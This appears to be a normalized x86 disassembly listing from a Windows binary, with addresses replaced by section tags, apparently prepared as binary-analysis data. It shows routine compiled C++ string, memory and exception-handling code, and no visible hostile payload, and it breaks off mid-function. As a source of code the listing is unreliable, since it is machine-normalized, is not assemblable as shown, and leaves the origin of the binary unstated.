mov edx [ esi + 0x50 ]
push eax
push edx
push ebx
mov [ ebp - 0x10 ] eax
call sub_1000e7d0
add esp 0x20
mov [ ebp + 0x10 ] edi
cmp [ esi + 0x50 ] edi
jbe r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp r-xdata
mov eax [ esi + 0x4c ]
mov ecx [ ebp + 0x10 ]
mov esi [ eax + ecx * 4 ]
push 0x4c
push ebx
mov [ ebp - 0x8 ] esi
call sub_1006ee90
mov edi eax
mov ecx 0x13
[ edi ] [ esi ]
mov edi [ ebp - 0x8 ]
mov edx [ edi + 0x4 ]
push edx
push ebx
mov [ ebp - 0xc ] eax
call sub_1004c490
mov esi [ ebp - 0xc ]
mov [ esi + 0x4 ] eax
mov eax [ edi + 0x10 ]
push eax
push ebx
call sub_1004c490
mov ecx [ ebp - 0x10 ]
push ecx
push esi
push ebx
mov [ esi + 0x10 ] eax
call sub_10046530
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
inc eax
add esp 0x24
mov [ ebp + 0x10 ] eax
cmp eax [ edx + 0x50 ]
jb r-xdata
mov esi edx
sub_1002f551
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1003ddf5
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100187af
pop ecx
sub_1002f578
push 0xe0
mov eax sub_100859cc
call sub_1003fae8
mov eax [ ebp + 0x8 ]
mov [ ebp - 0xa4 ] eax
movzx eax [ ebp + 0x1c ]
mov esi ecx
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x90 ] ecx
mov [ ebp - 0x94 ] eax
xor ebx ebx
mov [ ebp - 0x4 ] ebx
cmp [ ebp + 0x14 ] bl
je r-xdata
lea eax [ ebp - 0xac ]
push eax
call sub_10013950
push eax
mov [ ebp - 0x4 ] 0x2
call sub_10059fdf
pop ecx
mov edi eax
mov [ ebp - 0x88 ] eax
lea ecx [ ebp - 0xac ]
lea eax [ ebp - 0xa8 ]
push eax
call sub_10013950
push eax
mov [ ebp - 0x4 ] 0x1
call sub_100129d7
mov edi eax
pop ecx
mov [ ebp - 0x88 ] edi
lea ecx [ ebp - 0xa8 ]
jmp r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
sub eax [ ebp + 0x34 ]
push esi
inc eax
push eax
push ebx
lea ecx [ ebp + 0x24 ]
call sub_10068b7d
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
call sub_10034a80
add esi 0x8
push esi
push ebx
push 0x30
call sub_100578b0
movzx esi ax
add esp 0xc
lea eax [ ebp - 0x48 ]
push eax
mov ecx edi
mov [ ebp - 0x98 ] esi
call sub_1000ff3d
mov eax [ edi ]
mov ecx edi
mov [ ebp - 0x4 ] 0x3
call [ eax + 0x1c ]
cdq
xor eax edx
sub eax edx
mov [ ebp - 0x8c ] eax
cmp [ ebp + 0x34 ] eax
ja r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x48 ]
and [ ebp - 0x1c ] 0x0
push 0x7
pop edi
xor eax eax
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x2c ] ax
cmp [ ebp + 0x20 ] 0x0
mov esi [ ebp - 0x88 ]
mov eax [ esi ]
lea ecx [ ebp - 0x84 ]
push ecx
mov [ ebp - 0x4 ] 0x4
mov ecx esi
je r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
call [ eax + 0x20 ]
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x84 ] eax
lea eax [ ebp - 0x80 ]
push eax
mov ecx esi
call sub_10055b84
mov [ ebp - 0x4 ] 0x6
call [ eax + 0x24 ]
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x84 ] eax
lea eax [ ebp - 0x80 ]
push eax
mov ecx esi
call sub_10055017
mov [ ebp - 0x4 ] 0x5
jmp r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x48 ]
mov edi [ ebp - 0x8c ]
xor bl bl
xor edx edx
xor ecx ecx
mov ecx [ ebp - 0x88 ]
lea eax [ ebp - 0x80 ]
push eax
call sub_1006e90e
push eax
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x8
call sub_100649e0
push 0x0
push 0x1
lea ecx [ ebp - 0x80 ]
mov [ ebp - 0x4 ] 0x7
call sub_10063060
push eax
lea ecx [ ebp - 0x2c ]
call sub_100649e0
push 0x0
push 0x1
lea ecx [ ebp - 0x80 ]
call sub_10063060
and [ ebp - 0x54 ] 0x0
xor eax eax
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x64 ] ax
mov eax [ ebp - 0x90 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x4 ] 0x7
test al 0x8
je r-xdata
mov ecx [ ebp - 0x88 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
cmp [ ebp - 0x34 ] 0x10
mov edi [ ebp - 0x48 ]
movzx ebx ax
jae r-xdata
inc edx
sub eax 0x4
je r-xdata
mov esi [ ebp + 0x34 ]
sub esi [ ebp - 0x8c ]
jmp r-xdata
lea edi [ ebp - 0x48 ]
inc ecx
cmp ecx 0x4
jb r-xdata
mov bl 0x1
add edx [ ebp - 0x54 ]
jmp r-xdata
sub eax 0x7
je r-xdata
mov al [ edi ]
cmp al 0x7f
jne r-xdata
movsx eax [ ebp + ecx - 0x84 ]
sub eax 0x20
je r-xdata
mov ecx [ ebp - 0x90 ]
cmp [ ecx + 0x24 ] 0x0
mov eax [ ecx + 0x20 ]
jl r-xdata
add edx [ ebp - 0x1c ]
jmp r-xdata
sub eax 0x4b
je r-xdata
test al al
jle r-xdata
xor esi esi
jg r-xdata
cmp [ ebp + 0x34 ] edi
ja r-xdata
dec eax
dec eax
je r-xdata
movsx eax al
cmp eax esi
jae r-xdata
xor ebx ebx
cmp eax 0x100
jne r-xdata
cmp eax edx
jbe r-xdata
test eax eax
je r-xdata
xor eax eax
mov eax edi
sub eax [ ebp + 0x34 ]
inc eax
jmp r-xdata
cmp ecx 0x3
je r-xdata
jmp r-xdata
push ebx
sub esi eax
push 0x1
push esi
lea ecx [ ebp + 0x24 ]
call sub_10068b7d
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
push [ ebp - 0x94 ]
mov [ ebp - 0xa0 ] eax
mov eax [ ebp + 0x10 ]
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x9c ] eax
call sub_1002d770
mov eax [ ebp - 0xa0 ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x9c ]
mov [ ebp + 0x10 ] eax
sub eax 0x4
je r-xdata
push esi
push [ ebp - 0x94 ]
lea eax [ ebp - 0xa0 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1006c892
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x14
mov [ ebp + 0x10 ] eax
xor esi esi
test bl bl
jne r-xdata
sub eax edx
mov esi eax
jmp r-xdata
xor esi esi
cmp esi edi
sbb esi esi
neg esi
add esi [ ebp + 0x34 ]
add esi eax
add edx esi
jmp r-xdata
mov edi eax
inc ebx
cmp ebx 0x4
jb r-xdata
push esi
push [ ebp - 0x94 ]
lea eax [ ebp - 0xb4 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1006c892
add esp 0x14
xor esi esi
cmp [ ebp - 0x50 ] 0x8
mov eax [ ebp - 0x64 ]
jae r-xdata
sub eax 0x7
je r-xdata
mov eax ecx
mov eax [ eax + 0x14 ]
and eax 0x1c0
mov [ ebp - 0x8c ] eax
cmp eax 0x40
je r-xdata
movsx eax [ ebp + ebx - 0x84 ]
sub eax 0x20
je r-xdata
cmp [ ebp - 0x1c ] 0x1
jbe r-xdata
push [ ebp - 0x54 ]
push eax
lea eax [ ebp - 0xe4 ]
jmp r-xdata
lea eax [ ebp - 0x64 ]
cmp [ ebp - 0x1c ] 0x0
jbe r-xdata
sub eax 0x4b
je r-xdata
mov eax [ ebp - 0x90 ]
push esi
push [ ebp - 0x94 ]
xor edi edi
push [ ebp + 0x10 ]
mov [ eax + 0x20 ] edi
push [ ebp + 0xc ]
mov [ eax + 0x24 ] edi
push [ ebp - 0xa4 ]
call sub_1006c892
add esp 0x14
xor esi esi
push edi
inc esi
push esi
lea ecx [ ebp - 0x64 ]
call sub_10063060
push edi
push esi
lea ecx [ ebp - 0x2c ]
call sub_10063060
push edi
push esi
lea ecx [ ebp - 0x48 ]
call sub_1002c8c0
push edi
push esi
lea ecx [ ebp + 0x24 ]
call sub_10063060
mov eax [ ebp - 0xa4 ]
call sub_1004642f
retn 0x38
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
test edi edi
jne r-xdata
dec eax
dec eax
je r-xdata
mov ecx [ ebp - 0x1c ]
add eax 0x2
dec ecx
push ecx
push eax
push [ ebp + 0x10 ]
lea eax [ ebp - 0xb4 ]
push [ ebp + 0xc ]
push eax
call sub_1002c599
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x14
mov [ ebp + 0x10 ] eax
lea eax [ ebp - 0x2c ]
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
push 0x1
push eax
lea eax [ ebp - 0xec ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp + 0x34 ] edi
ja r-xdata
cmp [ ebp + 0x38 ] 0x8
mov eax [ ebp + 0x24 ]
jae r-xdata
cmp [ ebp - 0x8c ] 0x100
jne r-xdata
jmp r-xdata
cmp [ ebp + 0x38 ] 0x8
mov eax [ ebp + 0x24 ]
jae r-xdata
push [ ebp - 0x98 ]
lea ecx [ ebp + 0xc ]
call sub_1002d770
mov ecx [ ebp - 0x88 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
movzx eax ax
push eax
lea ecx [ ebp + 0xc ]
call sub_1002d770
mov eax edi
sub eax [ ebp + 0x34 ]
push eax
push [ ebp - 0x98 ]
lea eax [ ebp - 0xd4 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1006c892
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov ecx [ eax + 0x4 ]
add esp 0x14
cmp [ ebp + 0x38 ] 0x8
mov [ ebp + 0x10 ] ecx
mov ecx [ ebp + 0x24 ]
jae r-xdata
push [ ebp + 0x34 ]
push eax
lea eax [ ebp - 0xbc ]
lea eax [ ebp + 0x24 ]
mov ecx [ ebp + 0x34 ]
sub ecx edi
push ecx
push eax
push [ ebp + 0x10 ]
lea eax [ ebp - 0xcc ]
push [ ebp + 0xc ]
push eax
call sub_1002c599
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov ecx [ ebp - 0x88 ]
mov [ ebp + 0x10 ] eax
mov eax [ ecx ]
add esp 0x14
call [ eax + 0x4 ]
movzx eax ax
push eax
lea ecx [ ebp + 0xc ]
call sub_1002d770
cmp [ ebp + 0x38 ] 0x8
mov eax [ ebp + 0x24 ]
jae r-xdata
lea eax [ ebp + 0x24 ]
push [ ebp + 0x34 ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0xc4 ]
jmp r-xdata
lea ecx [ ebp + 0x24 ]
mov ecx [ ebp + 0x34 ]
sub ecx edi
lea eax [ eax + ecx * 2 ]
push edi
push eax
lea eax [ ebp - 0xdc ]
jmp r-xdata
lea eax [ ebp + 0x24 ]
push eax
call sub_1002c599
add esp 0x14
jmp r-xdata
sub_1002faf1
push 0x4
mov eax sub_10085139
call sub_100624bc
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_10034e98
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov esi eax
mov eax [ eax ]
mov ecx esi
mov [ rw-data ] eax
call sub_1001d9f5
push esi
call sub_100187af
pop ecx
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_10069747
call sub_10013ab8
retn
sub_1002fb3f
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_10029a2f
pop ecx
pop ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x61 ]
cmp ecx 0x19
ja r-xdata
pop ebp
retn
add eax 0xffffffe0
pop ebp
retn
sub_1002fb6b
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x8 ]
call sub_1000b33e
mov edi eax
pop ecx
test edi edi
jne r-xdata
sub_1002fbb0
cmp [ esi + 0x6c ] 0x8
jb r-xdata
push ebx
push edi
xor edi edi
mov ebx 0x7
xor ecx ecx
mov [ esi + 0x6c ] ebx
mov [ esi + 0x68 ] edi
mov [ esi + 0x58 ] cx
cmp [ esi + 0x50 ] 0x8
jb r-xdata
mov eax [ esi + 0x58 ]
push eax
call sub_100187af
add esp 0x4
xor eax eax
mov [ esi + 0x50 ] ebx
mov [ esi + 0x4c ] edi
mov [ esi + 0x3c ] ax
cmp [ esi + 0x30 ] 0x8
jb r-xdata
mov edx [ esi + 0x3c ]
push edx
call sub_100187af
add esp 0x4
xor edx edx
mov [ esi + 0x30 ] ebx
mov [ esi + 0x2c ] edi
mov [ esi + 0x1c ] dx
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov ecx [ esi + 0x1c ]
push ecx
call sub_100187af
add esp 0x4
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] ebx
xor ecx ecx
pop edi
mov [ esi ] cx
pop ebx
retn
mov eax [ esi ]
push eax
call sub_100187af
add esp 0x4
sub_1002fc40
push ebp
mov ebp esp
push 0xffffffff
push sub_100877f0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x184
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x168 ] ecx
mov ecx [ ebp + 0xc ]
xor ebx ebx
mov [ ebp - 0x164 ] eax
mov [ ebp - 0x16c ] edx
mov [ ebp - 0x170 ] ecx
cmp [ eax + 0xec ] ebx
jne r-xdata
mov ecx [ eax + 0x108 ]
add ecx [ eax + 0x100 ]
mov edx [ eax + 0x50 ]
lea esi [ ecx * 8 ]
sub esi ecx
mov ecx [ eax + 0xd8 ]
lea edx [ esi + edx + 0x2e ]
cmp ecx edx
jbe r-xdata
lea eax [ ebx + 0x42 ]
jmp r-xdata
mov ecx 0x1f4
sub ecx edx
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp - 0x170 ]
cmp [ edx + 0x10 ] ebx
mov edi [ ebp - 0x164 ]
sete al
xor ecx ecx
cmp al bl
sete cl
lea esi [ ebp - 0x154 ]
add ecx 0x6
push ecx
call sub_10057a60
mov [ ebp - 0x4 ] ebx
push 0x2
push r--data
lea ecx [ ebp - 0x9c ]
mov [ ebp - 0x88 ] 0xf
mov [ ebp - 0x8c ] ebx
mov [ ebp - 0x9c ] bl
call sub_10037e00
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp - 0x150 ]
mov esi [ ebp - 0x154 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
mov [ ebp - 0x15c ] eax
mov eax [ eax + 0x10c ]
shr ecx 0x3
mov [ ebp - 0x15c ] ecx
cmp ecx eax
jbe r-xdata
push esi
lea eax [ ebp - 0x154 ]
call sub_100629b0
mov esi [ ebp - 0x164 ]
push eax
push esi
lea edi [ ebp - 0x9c ]
call sub_10059c40
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
jne r-xdata
push r--data
call sub_1002d84e
push edi
push esi
lea eax [ ebp - 0x154 ]
call sub_10064570
mov edx [ ebp - 0x168 ]
push edx
mov [ ebp - 0x184 ] eax
lea eax [ ebp - 0x10c ]
push r--data
push eax
call sub_100403d0
add esp 0xc
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x1
ja r-xdata
push r--data
call sub_1002d84e
lea eax [ edi + 0x1c ]
push eax
lea eax [ ebp - 0x154 ]
call sub_100629b0
push eax
push esi
lea edi [ ebp - 0x10c ]
call sub_10059c40
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
ja r-xdata
push r--data
call sub_1002d84e
lea eax [ edi + 0x1c ]
push eax
push esi
lea eax [ ebp - 0x154 ]
call sub_10064570
push 0x3
push r--data
lea ecx [ ebp - 0xb8 ]
mov [ ebp - 0x168 ] eax
mov [ ebp - 0xa4 ] 0xf
mov [ ebp - 0xa8 ] ebx
mov [ ebp - 0xb8 ] bl
call sub_10037e00
mov [ ebp - 0x4 ] 0x3
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x2
ja r-xdata
push r--data
call sub_1002d84e
lea eax [ edi + 0x38 ]
push eax
lea eax [ ebp - 0x154 ]
call sub_100629b0
push eax
push esi
lea edi [ ebp - 0xb8 ]
call sub_10059c40
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x2
ja r-xdata
push r--data
call sub_1002d84e
lea eax [ edi + 0x38 ]
push eax
push esi
lea eax [ ebp - 0x154 ]
call sub_10064570
push 0x1
push r--data
lea ecx [ ebp - 0x80 ]
mov [ ebp - 0x18c ] eax
mov [ ebp - 0x6c ] 0xf
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x80 ] bl
call sub_10037e00
mov [ ebp - 0x4 ] 0x4
push 0x1
lea ecx [ ebp - 0x80 ]
cmp [ esi ] ebx
jne r-xdata
push r--data
call sub_1002d84e
push r--data
push r--data
jmp r-xdata
lea eax [ edi + 0x54 ]
push eax
lea eax [ ebp - 0x154 ]
call sub_100629b0
push eax
push esi
lea edi [ ebp - 0x80 ]
call sub_10059c40
mov ecx [ ebp - 0x150 ]
mov esi [ ebp - 0x154 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x3
ja r-xdata
push r--data
call sub_1002d84e
call sub_1002e070
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x3
ja r-xdata
mov ecx [ ebp - 0x164 ]
lea eax [ esi + 0x54 ]
push eax
push ecx
lea eax [ ebp - 0x154 ]
call sub_10064570
mov edx [ ebp - 0x15c ]
push edx
lea esi [ ebp - 0x48 ]
mov [ ebp - 0x188 ] eax
call sub_1003e830
add esp 0x4
push eax
lea eax [ ebp - 0x128 ]
push r--data
push eax
mov [ ebp - 0x4 ] 0x5
call sub_10057800
add esp 0xc
mov [ ebp - 0x4 ] 0x7
cmp [ ebp - 0x34 ] 0x10
jb r-xdata
push r--data
call sub_1002d84e
mov ecx [ ebp - 0x150 ]
mov esi [ ebp - 0x154 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
mov [ ebp - 0x34 ] 0xf
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] bl
cmp eax 0x4
ja r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_100187af
add esp 0x4
lea eax [ esi + 0x70 ]
push eax
lea eax [ ebp - 0x154 ]
call sub_100629b0
mov ecx [ ebp - 0x164 ]
push eax
push ecx
lea edi [ ebp - 0x128 ]
call sub_10059c40
mov ecx [ ebp - 0x150 ]
mov esi [ ebp - 0x154 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x4
ja r-xdata
push r--data
call sub_1002d84e
mov ecx [ ebp - 0x164 ]
lea eax [ esi + 0x70 ]
push eax
push ecx
lea eax [ ebp - 0x154 ]
call sub_10064570
push 0x227a9
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x15c ] eax
call sub_1003e830
add esp 0x4
push eax
lea edx [ ebp - 0xf0 ]
push r--data
push edx
mov [ ebp - 0x4 ] 0x8
call sub_10057800
add esp 0xc
mov [ ebp - 0x4 ] 0xa
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
push r--data
call sub_1002d84e
mov ecx [ ebp - 0x150 ]
mov esi [ ebp - 0x154 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
cmp ecx 0x5
ja r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_100187af
add esp 0x4
lea eax [ esi + 0x8c ]
push eax
lea eax [ ebp - 0x154 ]
call sub_100629b0
mov esi [ ebp - 0x164 ]
push eax
push esi
lea edi [ ebp - 0xf0 ]
call sub_10059c40
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x5
ja r-xdata
push r--data
call sub_1002d84e
lea eax [ edi + 0x8c ]
push eax
push esi
lea eax [ ebp - 0x154 ]
call sub_10064570
mov [ ebp - 0x180 ] eax
mov [ ebp - 0xc0 ] 0xf
mov [ ebp - 0xc4 ] ebx
mov [ ebp - 0xd4 ] bl
mov eax [ ebp - 0x170 ]
mov [ ebp - 0x4 ] 0xb
cmp [ eax + 0x10 ] ebx
je r-xdata
push r--data
call sub_1002d84e
mov edx [ ebp - 0x184 ]
push edx
lea eax [ ebp - 0x64 ]
push eax
call sub_10041240
mov esi eax
lea ecx [ ebp - 0x9c ]
push ecx
lea edx [ ebp - 0x48 ]
push r--data
push edx
mov [ ebp - 0x4 ] 0xd
call sub_100403d0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0xe
call sub_1000be00
mov edi eax
mov [ ebp - 0x4 ] 0xf
mov esi [ ebp - 0x150 ]
mov ecx [ ebp - 0x154 ]
sub esi ecx
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
push eax
lea ecx [ ebp - 0x2c ]
push r--data
push ecx
call sub_100403d0
add esp 0xc
push eax
lea ecx [ ebp - 0xd4 ]
mov [ ebp - 0x4 ] 0xc
call sub_10021bf0
mov [ ebp - 0x4 ] 0xb
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
push 0xffffffff
push ebx
push edi
call sub_1005e580
mov esi 0x10
cmp [ ebp - 0x18 ] esi
jb r-xdata
push r--data
call sub_1002d84e
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x6
ja r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_100187af
add esp 0x4
mov edi 0xf
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
cmp [ ebp - 0x34 ] esi
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_100187af
add esp 0x4
lea eax [ edi + 0xa8 ]
push eax
lea eax [ ebp - 0x154 ]
call sub_100629b0
push eax
push esi
lea edi [ ebp - 0xd4 ]
call sub_10059c40
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x6
ja r-xdata
push r--data
call sub_1002d84e
mov [ ebp - 0x4 ] 0xb
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] bl
cmp [ ebp - 0x50 ] esi
jb r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_100187af
add esp 0x4
lea eax [ edi + 0xa8 ]
push eax
push esi
lea eax [ ebp - 0x154 ]
call sub_10064570
mov [ ebp - 0x17c ] eax
push r--data
call sub_1002d84e
mov ecx [ ebp - 0x168 ]
push ecx
lea edx [ ebp - 0x64 ]
push edx
call sub_10041240
mov esi eax
lea eax [ ebp - 0x10c ]
push eax
lea ecx [ ebp - 0x48 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x10
call sub_100403d0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x11
call sub_1000be00
mov esi eax
mov [ ebp - 0x4 ] 0x12
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
ja r-xdata
mov eax [ ebp - 0x64 ]
push eax
call sub_100187af
add esp 0x4
push 0xffffffff
push ebx
lea ecx [ edi + 0x1c ]
push esi
call sub_1005e580
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
push r--data
call sub_1002d84e
mov edi 0x10
mov esi 0xf
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
cmp [ ebp - 0x34 ] edi
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_100187af
add esp 0x4
mov [ ebp - 0x4 ] 0xb
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] bl
cmp [ ebp - 0x50 ] edi
jb r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_100187af
add esp 0x4
mov ecx [ ebp - 0x18c ]
push ecx
lea edx [ ebp - 0x64 ]
push edx
call sub_10041240
mov esi eax
lea eax [ ebp - 0xb8 ]
push eax
lea ecx [ ebp - 0x48 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x13
call sub_100403d0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x14
call sub_1000be00
mov esi eax
mov [ ebp - 0x4 ] 0x15
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x2
ja r-xdata
mov eax [ ebp - 0x64 ]
push eax
call sub_100187af
add esp 0x4
push 0xffffffff
push ebx
lea ecx [ edi + 0x38 ]
push esi
call sub_1005e580
mov esi 0x10
cmp [ ebp - 0x18 ] esi
jb r-xdata
push r--data
call sub_1002d84e
mov edi 0xf
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
cmp [ ebp - 0x34 ] esi
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_100187af
add esp 0x4
mov [ ebp - 0x4 ] 0xb
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] bl
cmp [ ebp - 0x50 ] esi
jb r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_100187af
add esp 0x4
mov ecx [ ebp - 0x188 ]
push ecx
lea edx [ ebp - 0x64 ]
push edx
call sub_10041240
mov esi eax
lea eax [ ebp - 0x80 ]
push eax
lea ecx [ ebp - 0x48 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x16
call sub_100403d0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x17
call sub_1000be00
mov esi eax
mov [ ebp - 0x4 ] 0x18
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
